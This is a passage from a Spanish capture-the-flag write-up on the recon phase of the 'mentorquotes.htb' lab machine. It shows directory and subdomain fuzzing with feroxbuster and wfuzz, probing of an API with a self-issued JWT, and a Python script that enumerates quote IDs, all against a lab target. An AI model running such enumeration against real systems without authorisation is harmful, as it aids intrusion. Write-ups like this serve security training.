+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span> 💥  Timeout (secs)        │ <span style="color:#ff0;font-weight:bold">7</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span> 🦡  User-Agent            │ feroxbuster/2.10.4
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span> 🔎  Extract Links         │ <span style="color:#fff;font-weight:bold">true</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span> 🏁  HTTP methods          │ [GET]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span> 🔃  Recursion Depth       │ <span style="color:#ff0;font-weight:bold">1</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>───────────────────────────┴──────────────────────
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span> 🏁  Press [ENTER] to use the Scan Management Menu™
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>──────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span><span style="color:#ff0;font-weight:bold">404</span>      GET        4l       34w      232c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span><span style="color:#ff0;font-weight:bold">200</span>      GET      167l      621w     5506c http://mentorquotes.htb/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span><span style="color:#ff0;font-weight:bold">404</span>      GET        9l       31w      278c http://mentorquotes.htb/http%3A%2F%2Fwww
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span>[<span style="color:#007f7f">##&gt;-----------------] - 78s    28178/220545  11m     found:2       errors:561</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24</span><span>🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_mentorquotes_htb_-1722544677.state ...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25</span><span>[<span style="color:#007f7f">##&gt;-----------------] - 78s    28183/220545  11m     found:2       errors:561</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26</span><span>[<span style="color:#007f7f">##&gt;-----------------] - 78s    28174/220545  361/s   http://mentorquotes.htb/</span></span></span></code></pre></div>
+<p>Así que decidí fuzzear por subdominios.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ wfuzz --hc=<span style="color:#ff0;font-weight:bold">302</span> -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H <span style="color:#0ff;font-weight:bold">&#39;Host: FUZZ.mentorquotes.htb&#39;</span> http://mentorquotes.htb
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span style="color:#f00">&#39;</span>s documentation <span style="color:#fff;font-weight:bold">for</span> more information.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>********************************************************
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>********************************************************
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>Target: http://mentorquotes.htb/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>Total requests: 114441
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>=====================================================================
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>ID           Response   Lines    Word       Chars       Payload
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>=====================================================================
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>000000051:   <span style="color:#ff0;font-weight:bold">404</span>        <span style="color:#ff0;font-weight:bold">0</span> L      <span style="color:#ff0;font-weight:bold">2</span> W        <span style="color:#ff0;font-weight:bold">22</span> Ch       <span style="color:#0ff;font-weight:bold">&#34;api&#34;</span></span></span></code></pre></div>
+<p>Y encontré un subdominio <code>api</code>.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ curl -s http://api.mentorquotes.htb/ | jq
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>{
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>  <span style="color:#0ff;font-weight:bold">&#34;detail&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;Not Found&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>}</span></span></code></pre></div>
+<h1 id="api-enumeration">API Enumeration</h1>
+<p>Con el diccionario <code>SecLists/Discovery/Web-Content/api/api-endpoints.txt</code> Encontramos varias rutas interesantes.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span><span style="color:#ff0;font-weight:bold">200</span>      GET       69l      212w     2637c http://api.mentorquotes.htb/docs/oauth2-redirect
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span><span style="color:#ff0;font-weight:bold">200</span>      GET        1l       48w     7676c http://api.mentorquotes.htb/openapi.json
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span><span style="color:#ff0;font-weight:bold">307</span>      GET        0l        0w        0c http://api.mentorquotes.htb/docs/ =&gt; http://api.mentorquotes.htb/docs
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span><span style="color:#ff0;font-weight:bold">200</span>      GET       31l       62w      969c http://api.mentorquotes.htb/docs</span></span></code></pre></div>
+<p>Esta ruta de openapi.json y /docs, me hace pensar que existe un <code>swagger</code> detrás donde a parte de los endpoints, se expone un usuario <code>james</code>.
+<img src="images/Screenshot_1.png" alt="Write-up Image"></p>
+<p>Utilizo el endpoint de <code>/auth/signup</code> para crearme un usuario.
+<img src="images/Screenshot_2.png" alt="Write-up Image"></p>
+<p>Y al utilizar el endpoint de <code>/auth/login</code> obtenemos un JWT.
+<img src="images/Screenshot_3.png" alt="Write-up Image"></p>
+<p>Analizando este token, no encontramos nada interesante.
+<img src="images/Screenshot_4.png" alt="Write-up Image"></p>
+<p>Pero ahora puedo hacer solicitudes a otros endpoints para los cuales necesitaba autenticación.
+Me llama la atención el endpoint de <code>/users/</code> pero necesito una cuenta de administrador.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ curl -s http://api.mentorquotes.htb/users/ -H <span style="color:#0ff;font-weight:bold">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InBvaW50ZWQiLCJlbWFpbCI6InBvaW50ZWRAcG9pbnRlZC5jb20ifQ.JDca2XQVvnl1welcPDL02FYJalCOChzoLjRRSUgZsMg&#39;</span> | jq
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>{
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>  <span style="color:#0ff;font-weight:bold">&#34;detail&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;Only admin users can access this resource&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>}</span></span></code></pre></div>
+<p>Podemos ver todas las frases que salían en el sitio web.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ curl -s http://api.mentorquotes.htb/quotes/ -H <span style="color:#0ff;font-weight:bold">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InBvaW50ZWQiLCJlbWFpbCI6InBvaW50ZWRAcG9pbnRlZC5jb20ifQ.JDca2XQVvnl1welcPDL02FYJalCOChzoLjRRSUgZsMg&#39;</span> | jq
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>[
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>  {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>    <span style="color:#0ff;font-weight:bold">&#34;title&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34; I believed I was good&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>    <span style="color:#0ff;font-weight:bold">&#34;description&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;I was so bad at studies in school. Teachers used to tell me that I should follow a different passion other than typical education. Nonetheless, I got rid of the negativity in myself and others and worked as hard as I could in my finals and college education. Now I am a paid accountant for a major brand in my country.&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>    <span style="color:#0ff;font-weight:bold">&#34;id&#34;</span>: <span style="color:#ff0;font-weight:bold">1</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>  },
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>  {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>    <span style="color:#0ff;font-weight:bold">&#34;title&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;Find your passion before its too late&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>    <span style="color:#0ff;font-weight:bold">&#34;description&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;When I was growing up, I did not really have much, sure I enjoyed my passion but did not take it seriously. When I worked in a gas station for 3 years at that point I made a decision to go back to education and get a masters degree. Now I am a senior content engineer for a reputed company&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>    <span style="color:#0ff;font-weight:bold">&#34;id&#34;</span>: <span style="color:#ff0;font-weight:bold">2</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>  },
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>  {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>    <span style="color:#0ff;font-weight:bold">&#34;title&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;Never too late&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>    <span style="color:#0ff;font-weight:bold">&#34;description&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;I was a construction worker for almost 10 years. I had to work there because I did not have any educational background to work in the academic sector. But I realized I was not getting the best of my life. So I started investing in crypto. Learned about how investing is done professionally. Soon enough I was able to give up the construction sector and start my own business. I did all this in my 60s&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>    <span style="color:#0ff;font-weight:bold">&#34;id&#34;</span>: <span style="color:#ff0;font-weight:bold">3</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>  },
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>  {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>    <span style="color:#0ff;font-weight:bold">&#34;title&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;Age is just a number&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span>    <span style="color:#0ff;font-weight:bold">&#34;description&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;When I was was kid, I used to create very simple video games as a hobby. Because I loved it so much, I thought to myself that I am going to be a game developer someday. With self-motivation, I applied for a job as a game designer when I just finished school. Now I work there as a permanent video game developer. And I am really proud to be the youngest employee there.&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>    <span style="color:#0ff;font-weight:bold">&#34;id&#34;</span>: <span style="color:#ff0;font-weight:bold">4</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span>  },
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span>  {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24</span><span>    <span style="color:#0ff;font-weight:bold">&#34;title&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;Its all worth it in the end&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25</span><span>    <span style="color:#0ff;font-weight:bold">&#34;description&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;Working as a school teacher, I had a lot of responsibilities to fulfill. Even though I really loved teaching kids, the pressure was unbearable. I had 10-hour shifts at school including all the extra classes. But I did all of them to support the kids who needed my help. Now I am retired and I can not think of anything else that I would have done except this. When I see the kids I teach come and visit me telling how they enjoyed my teaching, all the hard work I put in is worth it.&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26</span><span>    <span style="color:#0ff;font-weight:bold">&#34;id&#34;</span>: <span style="color:#ff0;font-weight:bold">5</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27</span><span>  }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28</span><span>]</span></span></code></pre></div>
+<p>Tampoco podemos crear ni editar una frase.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ curl -s -X POST http://api.mentorquotes.htb/quotes/ -H <span style="color:#0ff;font-weight:bold">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InBvaW50ZWQiLCJlbWFpbCI6InBvaW50ZWRAcG9pbnRlZC5jb20ifQ.JDca2XQVvnl1welcPDL02FYJalCOChzoLjRRSUgZsMg&#39;</span> -H <span style="color:#0ff;font-weight:bold">&#39;Content-Type: application/json&#39;</span> --data <span style="color:#0ff;font-weight:bold">&#39;{&#34;title&#34;: &#34;testing&#34;, &#34;description&#34;: &#34;testing&#34;}&#39;</span> | jq
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>{
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>  <span style="color:#0ff;font-weight:bold">&#34;detail&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;Only admin users can access this resource&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>┌─[192.168.1.52]─[pointedsec@parrot]─[~/Desktop/mentor/scan]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>└──╼ [★]$ curl -s -X PUT http://api.mentorquotes.htb/quotes/1/ -H <span style="color:#0ff;font-weight:bold">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InBvaW50ZWQiLCJlbWFpbCI6InBvaW50ZWRAcG9pbnRlZC5jb20ifQ.JDca2XQVvnl1welcPDL02FYJalCOChzoLjRRSUgZsMg&#39;</span> -H <span style="color:#0ff;font-weight:bold">&#39;Content-Type: application/json&#39;</span> --data <span style="color:#0ff;font-weight:bold">&#39;{&#34;title&#34;: &#34;testing&#34;, &#34;description&#34;: &#34;testing&#34;}&#39;</span> | jq
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>{
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>  <span style="color:#0ff;font-weight:bold">&#34;detail&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;Only admin users can access this resource&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>}</span></span></code></pre></div>
+<p>Pensé que quizás existía alguna frase oculta que no se podía ver a simple vista, así que hice un script en python para intentar descubrirlas pero no sirvió.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span><span style="color:#f00">!</span>/usr/<span style="color:#fff;font-weight:bold">bin</span>/python3
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span><span style="color:#fff;font-weight:bold">import</span> requests
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>JWT = <span style="color:#0ff;font-weight:bold">&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InBvaW50ZWQiLCJlbWFpbCI6InBvaW50ZWRAcG9pbnRlZC5jb20ifQ.JDca2XQVvnl1welcPDL02FYJalCOChzoLjRRSUgZsMg&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>BASE_URL = <span style="color:#0ff;font-weight:bold">&#34;http://api.mentorquotes.htb/quotes/&lt;ID&gt;/&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>BAD_QUOTE_LENGTH = <span style="color:#ff0;font-weight:bold">28</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span><span style="color:#fff;font-weight:bold">def</span> brute():
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>    headers = {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>        <span style="color:#0ff;font-weight:bold">&#34;Authorization&#34;</span>: JWT
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>    }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>    <span style="color:#fff;font-weight:bold">for</span> i in <span style="color:#fff;font-weight:bold">range</span>(<span style="color:#ff0;font-weight:bold">200</span>):
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>        r = requests.get(BASE_URL.replace(<span style="color:#0ff;font-weight:bold">&#34;&lt;ID&gt;&#34;</span>, <span style="color:#fff;font-weight:bold">str</span>(i)), headers=headers)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>        <span style="color:#fff;font-weight:bold">if</span> (<span style="color:#fff;font-weight:bold">len</span>(r.text) != BAD_QUOTE_LENGTH):
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>            <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;[+] Quote with ID: &#34;</span> + <span style="color:#fff;font-weight:bold">str</span>(i) + <span style="color:#0ff;font-weight:bold">&#34; exists&#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span><span style="color:#fff;font-weight:bold">if</span> __name__ == <span style="color:#0ff;font-weight:bold">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>    brute()</span></span></code></pre></div>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ python3 brute.py
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>[+] Quote with ID: <span style="color:#ff0;font-weight:bold">0</span> exists
